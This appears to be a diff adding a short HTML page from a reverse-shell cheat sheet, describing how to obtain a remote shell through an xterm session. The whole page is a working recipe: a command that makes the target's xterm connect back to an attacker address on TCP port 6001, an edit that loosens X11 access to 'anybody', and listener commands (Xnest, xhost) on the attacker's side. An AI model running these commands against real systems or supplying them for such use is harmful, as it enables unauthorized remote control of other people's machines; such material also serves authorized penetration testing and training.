@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Xterm</title>
+</head><body><br/>
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port <b>6001</b>.<br/>
+<br/>
+&nbsp;xterm -display 10.0.0.1:1 <br/>
+<br/>
+We need to modify /etc/X11/Xwrapper.config and change the allowed_users line to look like this. This file often gets overwritten on updates. After the file has been saved, restart the X11 login manager.<br/>
+<br/>
+allowed_users=anybody<br/>
+<br/>
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):<br/>
+<br/>
+&nbsp;Xnest -ac :1<br/>
+<br/>
+You’ll need to authorize the target to connect to you (command also run on your host):<br/>
+<br/>
+&nbsp;xhost +targetip</body></html>
